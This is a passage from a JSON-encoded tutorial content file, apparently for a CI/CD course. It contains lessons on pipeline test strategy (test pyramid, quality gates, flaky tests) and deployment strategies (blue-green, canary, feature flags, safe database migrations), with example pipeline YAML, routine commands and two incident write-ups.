dozen\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Smoke\u003c/td>\n\u003ctd>&quot;Is the deployed service alive and answering?&quot;\u003c/td>\n\u003ctd>Seconds\u003c/td>\n\u003ctd>A handful\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>The shape matters. Many fast unit tests find most defects cheaply. A few end-to-end tests prove the pieces work together. An inverted pyramid, with mostly slow browser tests, produces pipelines that take an hour and fail for reasons unrelated to the change.\u003c/p>\n\u003ch2 id=\"ordering-stages-for-fast-feedback\">Ordering stages for fast feedback\u003c/h2>\n\u003cp>Run the cheapest, most informative checks first and stop at the first failure. Run independent checks in parallel.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"stages: [lint, test, build, scan, deploy-staging, smoke]\n\nlint:\n  stage: lint\n  script:\n    - ruff check .\n    - yamllint deploy/\n    - hadolint Dockerfile\n\nunit:\n  stage: test\n  script:\n    - python -m pytest tests/unit -q --cov=app --cov-fail-under=80\n\nintegration:\n  stage: test\n  services:\n    - postgres:16\n  script:\n    - python -m pytest tests/integration -q\n\nbuild-image:\n  stage: build\n  script:\n    - docker build -t registry.example.com/shop/api:${BUILD_ID} .\n\nscan-image:\n  stage: scan\n  script:\n    - trivy image --exit-code 1 --severity CRITICAL registry.example.com/shop/api:${BUILD_ID}\n\nsmoke:\n  stage: smoke\n  script:\n    - curl -fsS -m 10 https://staging.example.com/healthz\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">stages:\u003c/span> [\u003cspan class=\"hljs-string\">lint\u003c/span>, \u003cspan class=\"hljs-string\">test\u003c/span>, \u003cspan class=\"hljs-string\">build\u003c/span>, \u003cspan class=\"hljs-string\">scan\u003c/span>, \u003cspan class=\"hljs-string\">deploy-staging\u003c/span>, \u003cspan class=\"hljs-string\">smoke\u003c/span>]\n\n\u003cspan class=\"hljs-attr\">lint:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">lint\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">ruff\u003c/span> \u003cspan class=\"hljs-string\">check\u003c/span> \u003cspan class=\"hljs-string\">.\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">yamllint\u003c/span> \u003cspan class=\"hljs-string\">deploy/\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">hadolint\u003c/span> \u003cspan class=\"hljs-string\">Dockerfile\u003c/span>\n\n\u003cspan class=\"hljs-attr\">unit:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">python\u003c/span> \u003cspan class=\"hljs-string\">-m\u003c/span> \u003cspan class=\"hljs-string\">pytest\u003c/span> \u003cspan class=\"hljs-string\">tests/unit\u003c/span> \u003cspan class=\"hljs-string\">-q\u003c/span> \u003cspan class=\"hljs-string\">--cov=app\u003c/span> \u003cspan class=\"hljs-string\">--cov-fail-under=80\u003c/span>\n\n\u003cspan class=\"hljs-attr\">integration:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">services:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">postgres:16\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">python\u003c/span> \u003cspan class=\"hljs-string\">-m\u003c/span> \u003cspan class=\"hljs-string\">pytest\u003c/span> \u003cspan class=\"hljs-string\">tests/integration\u003c/span> \u003cspan class=\"hljs-string\">-q\u003c/span>\n\n\u003cspan class=\"hljs-attr\">build-image:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">docker\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span> \u003cspan class=\"hljs-string\">-t\u003c/span> \u003cspan class=\"hljs-string\">registry.example.com/shop/api:${BUILD_ID}\u003c/span> \u003cspan class=\"hljs-string\">.\u003c/span>\n\n\u003cspan class=\"hljs-attr\">scan-image:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">scan\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">trivy\u003c/span> \u003cspan class=\"hljs-string\">image\u003c/span> \u003cspan class=\"hljs-string\">--exit-code\u003c/span> \u003cspan class=\"hljs-number\">1\u003c/span> \u003cspan class=\"hljs-string\">--severity\u003c/span> \u003cspan class=\"hljs-string\">CRITICAL\u003c/span> \u003cspan class=\"hljs-string\">registry.example.com/shop/api:${BUILD_ID}\u003c/span>\n\n\u003cspan class=\"hljs-attr\">smoke:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">smoke\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">curl\u003c/span> \u003cspan class=\"hljs-string\">-fsS\u003c/span> \u003cspan class=\"hljs-string\">-m\u003c/span> \u003cspan class=\"hljs-number\">10\u003c/span> \u003cspan class=\"hljs-string\">https://staging.example.com/healthz\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Lint finishes in seconds and catches typos and style problems before anyone waits for tests. The scan only runs on an image that built successfully. The smoke test runs against the freshly deployed staging environment.\u003c/p>\n\u003ch2 id=\"quality-gates\">Quality gates\u003c/h2>\n\u003cp>A \u003cstrong>gate\u003c/strong> is an automatic pass or fail rule. Useful gates include a minimum coverage threshold, no new high-severity static-analysis findings, no known critical vulnerabilities, and formatting that matches the project style.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python -m pytest --cov=app --cov-report=term-missing --cov-fail-under=80\nruff check . &amp;&amp; ruff format --check .\nshellcheck scripts/*.sh\nterraform fmt -check -recursive\nkubeconform -strict -summary k8s/\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python -m pytest --cov=app --cov-report=term-missing --cov-fail-under=80\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>ruff check . &amp;&amp; ruff format --check .\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>shellcheck scripts/*.sh\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>terraform \u003cspan class=\"hljs-built_in\">fmt\u003c/span> -check -recursive\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubeconform -strict -summary k8s/\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Set gates you will actually enforce. A coverage target nobody respects is noise. Prefer &quot;coverage on changed lines must not fall&quot; over one global number, and avoid chasing 100 percent: tests that exist only to touch lines add cost without finding bugs.\u003c/p>\n\u003ch2 id=\"flaky-tests\">Flaky tests\u003c/h2>\n\u003cp>A flaky test passes and fails with no code change. Common causes are timing assumptions, shared state between tests, order dependence, real network calls and clocks.\u003c/p>\n\u003cul>\n\u003cli>Replace \u003ccode>sleep\u003c/code> with waiting for a condition\u003c/li>\n\u003cli>Give each test its own data and clean it up\u003c/li>\n\u003cli>Freeze or inject the clock\u003c/li>\n\u003cli>Mock external services in unit tests\u003c/li>\n\u003cli>Run the suite in random order to expose hidden dependencies\u003c/li>\n\u003c/ul>\n\u003cp>When a flaky test is found, \u003cstrong>quarantine it quickly\u003c/strong>: move it to a non-blocking job, open a ticket with an owner and a deadline, and fix or delete it. Automatically re-running failures hides the problem and trains people to distrust red builds.\u003c/p>\n\u003ch2 id=\"keeping-the-pipeline-fast\">Keeping the pipeline fast\u003c/h2>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python -m pytest -q --durations=10\npython -m pytest -q -n auto\ndocker build --cache-from registry.example.com/shop/api:cache -t shop-api:test .\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python -m pytest -q --durations=10\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python -m pytest -q -n auto\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker build --cache-from registry.example.com/shop/api:cache -t shop-api:\u003cspan class=\"hljs-built_in\">test\u003c/span> .\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Aim for the commit-to-feedback loop under ten minutes. Cache dependencies, run tests in parallel, run only affected tests where tooling supports it, and move slow suites to a nightly job while keeping a representative subset on every change.\u003c/p>\n\u003ch2 id=\"incident-the-green-build-that-broke-production\">Incident: the green build that broke production\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A change passes every check and deploys. Within minutes checkout fails: the new code reads a database column that exists in the test database but not in production, because a migration was never applied to the production schema.\u003c/p>\n\u003c/aside>\n\u003cp>Unit tests mocked the database, and the integration tests ran against a schema created fresh from the model, not from the real migration history. Close the gap:\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python manage.py migrate --plan\npython manage.py makemigrations --check --dry-run\ncurl -fsS https://staging.example.com/healthz/db\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python manage.py migrate --plan\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python manage.py makemigrations --check --dry-run\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>curl -fsS https://staging.example.com/healthz/db\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Run integration tests against a database built by the same migrations that production uses, apply migrations in the pipeline before the application rollout, and add a smoke check that exercises a database-backed endpoint. Add a regression test for this exact case.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Letting the pipeline get slower until people skip it\u003c/li>\n\u003cli>Automatically retrying flaky tests instead of fixing them\u003c/li>\n\u003cli>Mocking everything so tests never touch real behaviour\u003c/li>\n\u003cli>Coverage thresholds that are never enforced or are gamed\u003c/li>\n\u003cli>Running end-to-end tests against shared, unstable environments\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-test-pyramid","text":"The test pyramid"},{"id":"ordering-stages-for-fast-feedback","text":"Ordering stages for fast feedback"},{"id":"quality-gates","text":"Quality gates"},{"id":"flaky-tests","text":"Flaky tests"},{"id":"keeping-the-pipeline-fast","text":"Keeping the pipeline fast"},{"id":"incident-the-green-build-that-broke-production","text":"Incident: the green build that broke production"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Martin Fowler: The practical test pyramid","u":"https://martinfowler.com/articles/practical-test-pyramid.html"},{"t":"pytest documentation","u":"https://docs.pytest.org/en/stable/"},{"t":"Grafana k6 documentation","u":"https://grafana.com/docs/k6/latest/"}],"text":"A pipeline that builds but does not test only delivers bugs faster. A pipeline with slow, flaky tests teaches people to ignore red builds. Good test strategy gives fast feedback first and expensive confidence later, and treats failures as information you can trust. What you will learn The test pyramid and what belongs at each level Ordering pipeline stages for fast feedback Quality gates: linting, coverage thresholds and static analysis Dealing with flaky tests and slow suites The test pyramid Level What it checks Speed How many Unit One function or class, no network or disk Milliseconds Thousands Integration A component with a real database, queue or API Seconds Hundreds End to end The deployed system through its public interface Minutes A few dozen Smoke \"Is the deployed service alive and answering?\" Seconds A handful The shape matters. Many fast unit tests find most defects cheaply. A few end-to-end tests prove the pieces work together. An inverted pyramid, with mostly slow browser tests, produces pipelines that take an hour and fail for reasons unrelated to the change. Ordering stages for fast feedback Run the cheapest, most informative checks first and stop at the first failure. Run independent checks in parallel. stages: [ lint , test , build , scan , deploy-staging , smoke ] lint: stage: lint script: - ruff check . - yamllint deploy/ - hadolint Dockerfile unit: stage: test script: - python -m pytest tests/unit -q --cov=app --cov-fail-under=80 integration: stage: test services: - postgres:16 script: - python -m pytest tests/integration -q build-image: stage: build script: - docker build -t registry.example.com/shop/api:${BUILD_ID} . scan-image: stage: scan script: - trivy image --exit-code 1 --severity CRITICAL registry.example.com/shop/api:${BUILD_ID} smoke: stage: smoke script: - curl -fsS -m 10 https://staging.example.com/healthz Lint finishes in seconds and catches typos and style problems before anyone waits for tests. The scan only runs on an image that built successfully. The smoke test runs against the freshly deployed staging environment. Quality gates A gate is an automatic pass or fail rule. Useful gates include a minimum coverage threshold, no new high-severity static-analysis findings, no known critical vulnerabilities, and formatting that matches the project style. $ python -m pytest --cov=app --cov-report=term-missing --cov-fail-under=80 $ ruff check . && ruff format --check . $ shellcheck scripts/*.sh $ terraform fmt -check -recursive $ kubeconform -strict -summary k8s/ Set gates you will actually enforce. A coverage target nobody respects is noise. Prefer \"coverage on changed lines must not fall\" over one global number, and avoid chasing 100 percent: tests that exist only to touch lines add cost without finding bugs. Flaky tests A flaky test passes and fails with no code change. Common causes are timing assumptions, shared state between tests, order dependence, real network calls and clocks. Replace sleep with waiting for a condition Give each test its own data and clean it up Freeze or inject the clock Mock external services in unit tests Run the suite in random order to expose hidden dependencies When a flaky test is found, quarantine it quickly : move it to a non-blocking job, open a ticket with an owner and a deadline, and fix or delete it. Automatically re-running failures hides the problem and trains people to distrust red builds. Keeping the pipeline fast $ python -m pytest -q --durations=10 $ python -m pytest -q -n auto $ docker build --cache-from registry.example.com/shop/api:cache -t shop-api: test . Aim for the commit-to-feedback loop under ten minutes. Cache dependencies, run tests in parallel, run only affected tests where tooling supports it, and move slow suites to a nightly job while keeping a representative subset on every change. Incident: the green build that broke production Incident A change passes every check and deploys. Within minutes checkout fails: the new code reads a database "},"cicd/deployment-strategies":{"html":"\u003cp>How you put a new version in front of users decides how much risk each release carries. A strategy answers three questions: how much traffic is exposed to the new version, how quickly can you go back, and how much extra capacity does it cost.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Rolling, blue-green and canary strategies\u003c/li>\n\u003cli>Feature flags and why deploy is not release\u003c/li>\n\u003cli>Safe handling of database changes\u003c/li>\n\u003cli>Automated verification and rollback\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-strategies\">The strategies\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Strategy\u003c/th>\n\u003cth>How it works\u003c/th>\n\u003cth>Strength\u003c/th>\n\u003cth>Weakness\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>\u003cstrong>Recreate\u003c/strong>\u003c/td>\n\u003ctd>Stop the old version, start the new one\u003c/td>\n\u003ctd>Simplest\u003c/td>\n\u003ctd>Downtime\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003cstrong>Rolling\u003c/strong>\u003c/td>\n\u003ctd>Replace instances a few at a time\u003c/td>\n\u003ctd>No extra capacity, no downtime\u003c/td>\n\u003ctd>Old and new run together for a while; slower rollback\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003cstrong>Blue-green\u003c/strong>\u003c/td>\n\u003ctd>Run the new version beside the old, then switch all traffic\u003c/td>\n\u003ctd>Instant switch and instant rollback\u003c/td>\n\u003ctd>Double capacity during the switch\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003cstrong>Canary\u003c/strong>\u003c/td>\n\u003ctd>Send a small share of traffic (say 5%) to the new version, then grow it\u003c/td>\n\u003ctd>Limits the damage of a bad release\u003c/td>\n\u003ctd>Needs traffic control and good metrics\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>In Kubernetes, a Deployment gives you rolling updates by default. Blue-green is commonly done by running two Deployments and switching a Service selector. Canary needs an ingress or service mesh that can split traffic by weight, or a progressive delivery controller.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# Blue-green switch: change which version the Service selects\napiVersion: v1\nkind: Service\nmetadata:\n  name: shop-api\nspec:\n  selector:\n    app: shop-api\n    track: green        # was: blue\n  ports:\n    - port: 80\n      targetPort: 8080\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># Blue-green switch: change which version the Service selects\u003c/span>\n\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">v1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Service\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">shop-api\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">selector:\u003c/span>\n    \u003cspan class=\"hljs-attr\">app:\u003c/span> \u003cspan class=\"hljs-string\">shop-api\u003c/span>\n    \u003cspan class=\"hljs-attr\">track:\u003c/span> \u003cspan class=\"hljs-string\">green\u003c/span>        \u003cspan class=\"hljs-comment\"># was: blue\u003c/span>\n  \u003cspan class=\"hljs-attr\">ports:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">port:\u003c/span> \u003cspan class=\"hljs-number\">80\u003c/span>\n      \u003cspan class=\"hljs-attr\">targetPort:\u003c/span> \u003cspan class=\"hljs-number\">8080\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"a-canary-needs-a-decision-rule\">A canary needs a decision rule\u003c/h2>\n\u003cp>A canary is only as good as the metrics you check. Decide in advance what &quot;healthy&quot; means and let automation judge it:\u003c/p>\n\u003cul>\n\u003cli>Error rate of the canary is no worse than the stable version\u003c/li>\n\u003cli>Latency at the 95th percentile within an agreed margin\u003c/li>\n\u003cli>No increase in crashes or restarts\u003c/li>\n\u003c/ul>\n\u003cp>If any check fails, traffic returns to the stable version automatically.\u003c/p>\n\u003ch2 id=\"separate-deploy-from-release\">Separate deploy from release\u003c/h2>\n\u003cp>A \u003cstrong>feature flag\u003c/strong> lets you put code into production switched off, then turn it on for a small group, then everyone. Deploying becomes routine and low-risk, and &quot;release&quot; becomes a business decision that can be reversed in seconds without redeploying.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"python\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"if flags.is_enabled(&quot;new-checkout&quot;, user_id=user.id):\n    return new_checkout(cart)\nreturn old_checkout(cart)\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-keyword\">if\u003c/span> flags.is_enabled(\u003cspan class=\"hljs-string\">&quot;new-checkout&quot;\u003c/span>, user_id=user.\u003cspan class=\"hljs-built_in\">id\u003c/span>):\n    \u003cspan class=\"hljs-keyword\">return\u003c/span> new_checkout(cart)\n\u003cspan class=\"hljs-keyword\">return\u003c/span> old_checkout(cart)\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Remove flags once a feature is fully released. Old flags become hidden complexity that nobody dares touch.\u003c/p>\n\u003ch2 id=\"databases-are-the-hard-part\">Databases are the hard part\u003c/h2>\n\u003cp>Code can be rolled back in seconds; data changes cannot. During a rolling or canary release both versions run against the same database, so every schema change must work with \u003cstrong>both\u003c/strong> the old and new code. Use the \u003cstrong>expand and contract\u003c/strong> pattern:\u003c/p>\n\u003col>\n\u003cli>\u003cstrong>Expand\u003c/strong>: add the new column or table (nullable, with no breaking change). Old code ignores it.\u003c/li>\n\u003cli>\u003cstrong>Migrate\u003c/strong>: deploy code that writes both and reads the new one; backfill existing data.\u003c/li>\n\u003cli>\u003cstrong>Contract\u003c/strong>: after the old version is gone and you are sure you will not roll back, remove the old column in a later release.\u003c/li>\n\u003c/ol>\n\u003cp>Never rename or drop a column in the same release that stops using it.\u003c/p>\n\u003ch2 id=\"verify-and-roll-back\">Verify and roll back\u003c/h2>\n\u003cp>After every deploy, run automated \u003cstrong>smoke tests\u003c/strong> against the real environment and watch key metrics for a short bake time. Define the rollback in advance: for Kubernetes, \u003ccode>kubectl rollout undo\u003c/code>; for blue-green, switch the selector back; for flags, turn the flag off. A rollback you have never practised is a guess.\u003c/p>\n\u003ch2 id=\"incident-a-canary-takes-down-checkout\">Incident: a canary takes down checkout\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A canary at 10% of traffic goes out at 14:00. At 14:06 the checkout error rate rises to 12% for the whole site, not just the canary.\u003c/p>\n\u003c/aside>\n\u003cp>Look at what the canary and stable versions have in common: the database.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl logs deploy/shop-api-canary -n shop --tail 3\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl logs deploy/shop-api-canary -n shop --\u003cspan class=\"hljs-built_in\">tail\u003c/span> 3\u003c/span>\u003cspan class=\"ln out\">ERROR: column &quot;currency_code&quot; of relation &quot;orders&quot; does not exist\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The new code expects a column that the migration has not created in this environment, and a second effect: the canary&#39;s failed requests hold database connections, starving the stable pods. Immediately set the canary weight to zero to stop the damage, which restores service.\u003c/p>\n\u003cp>The lessons are procedural: run the migration (the \u003cstrong>expand\u003c/strong> step) as its own earlier release and confirm it before the code that needs it, add a rule that aborts the canary automatically when the error rate climbs above a threshold, and keep connection pools sized so one bad version cannot exhaust the database.\u003c/p>\n\u003cfigure class=\"dg\" data-rows=\"3\" data-edges=\"new&gt;five;five&gt;gate;gate&gt;full;gate&gt;back\" style=\"--rows:3\">\u003cfigcaption class=\"dg-title\">A canary release step by step\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"50.0\" x2=\"37.5\" y2=\"50.0\"/>\u003cline x1=\"37.5\" y1=\"50.0\" x2=\"62.5\" y2=\"16.7\"/>\u003cline x1=\"62.5\" y1=\"16.7\" x2=\"87.5\" y2=\"16.7\"/>\u003cline x1=\"62.5\" y1=\"16.7\" x2=\"62.5\" y2=\"83.3\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"new\" data-kind=\"process\" style=\"left:12.5%;top:50.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">New version\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-edge\" data-act=\"dg-pick\" data-id=\"five\" data-kind=\"edge\" style=\"left:37.5%;top:50.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">5 percent traffic\u003c/span>\u003cspan class=\"dg-kind\">Network edge\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"gate\" data-kind=\"process\" style=\"left:62.5%;top:16.7%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Automatic check\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"full\" data-kind=\"process\" style=\"left:87.5%;top:16.7%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Full rollout\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"back\" data-kind=\"process\" style=\"left:62.5%;top:83.3%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Rollback\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, New version to 5 percent traffic; 2, 5 percent traffic to Automatic check; 3, Automatic check to Full rollout; 4, Automatic check to Rollback.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-edge\" aria-hidden=\"true\">\u003c/i>Network edge\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"new\">\u003cdt>New version \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Deployed beside the old one with no traffic.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> If it fails to start, nothing is lost.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"five\">\u003cdt>5 percent traffic \u003cspan class=\"dg-kt\">Network edge\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> A small share of users reach it while metrics are watched.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Without metrics you cannot see harm.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"gate\">\u003cdt>Automatic check \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Compare error rate and latency with the old version.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A weak check lets a bad build through.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"full\">\u003cdt>Full rollout \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Traffic moves up in steps to 100 percent.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Skipping steps removes the safety.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"back\">\u003cdt>Rollback \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Traffic returns to the old version in seconds.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A migration that is not reversible makes rollback unsafe.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>No rollback plan, or one that was never tried\u003c/li>\n\u003cli>Releasing database changes together with code that depends on them\u003c/li>\n\u003cli>Canaries without metrics or automatic abort\u003c/li>\n\u003cli>Leaving feature flags in the code for years\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-strategies","text":"The strategies"},{"id":"a-canary-needs-a-decision-rule","text":"A canary needs a decision rule"},{"id":"separate-deploy-from-release","text":"Separate deploy from release"},{"id":"databases-are-the-hard-part","text":"Databases are the hard part"},{"id":"verify-and-roll-back","text":"Verify and roll back"},{"id":"incident-a-canary-takes-down-checkout","text":"Incident: a canary takes down checkout"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Kubernetes: 